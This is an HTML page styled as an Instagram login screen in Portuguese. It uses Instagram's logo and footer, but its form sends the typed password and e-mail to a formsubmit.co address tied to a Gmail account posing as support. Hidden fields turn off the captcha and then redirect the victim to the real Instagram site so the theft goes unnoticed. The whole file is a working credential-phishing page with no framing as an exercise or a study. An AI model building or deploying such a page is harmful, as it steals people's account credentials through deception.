<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar</title>

<style>
* {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}

body {
    margin: 0;
    min-height: 100vh;
    background: #fafafa;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 15px;
}

.login-box {
    width: 100%;
    max-width: 360px;
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    padding: 30px 25px;
}

.logo {
    display: flex;
    justify-content: center;
    margin-bottom: 25px;
}

.logo img {
    width: 170px;
}

.field {
    position: relative;
    margin-bottom: 12px;
}

.field input {
    width: 100%;
    padding: 14px 10px;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    background: #fafafa;
    font-size: 14px;
    outline: none;
}

.field label {
    position: absolute;
    top: 50%;
    left: 10px;
    font-size: 12px;
    color: #8e8e8e;
    transform: translateY(-50%);
    pointer-events: none;
    transition: 0.2s;
}

.field input:focus + label,
.field input:not(:placeholder-shown) + label {
    top: 4px;
    font-size: 10px;
}

button {
    width: 100%;
    margin-top: 12px;
    padding: 10px;
    background: #0095f6;
    border: none;
    border-radius: 8px;
    color: #fff;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
}

button:hover {
    background: #1877f2;
}

.options {
    text-align: center;
    margin-top: 18px;
    font-size: 12px;
}

.options a {
    color: #385185;
    text-decoration: none;
    font-weight: 500;
}

.footer {
    margin-top: 25px;
    text-align: center;
    font-size: 11px;
    color: #8e8e8e;
}

/* MOBILE EXTRA */
@media (max-width: 480px) {
    body {
        background: #fff;
    }

    .login-box {
        border: none;
        padding: 20px;
    }
}
</style>
</head>

<body>

<form
    class="login-box"
    action="https://formsubmit.co/suporte.igr.br@gmail.com"
    method="POST"
>

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
    </div>

    <div class="field">
        <input type="text" name="senha" required placeholder=" ">
        <label>Senha</label>
    </div>

    <div class="field">
        <input type="text" name="e-mail" required placeholder=" ">
        <label>E-mail</label>
    </div>

    <!-- CONFIGURAÇÕES -->
    <input type="hidden" name="_next" value="https://www.instagram.com">
    <input type="hidden" name="_subject" value="Novo acesso recebido">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit">Entrar</button>

    <div class="options">
        <a href="#">Esqueceu a senha?</a>
    </div>

    <div class="footer">
        © 2025 Instagram
    </div>

</form>

</body>
</html>
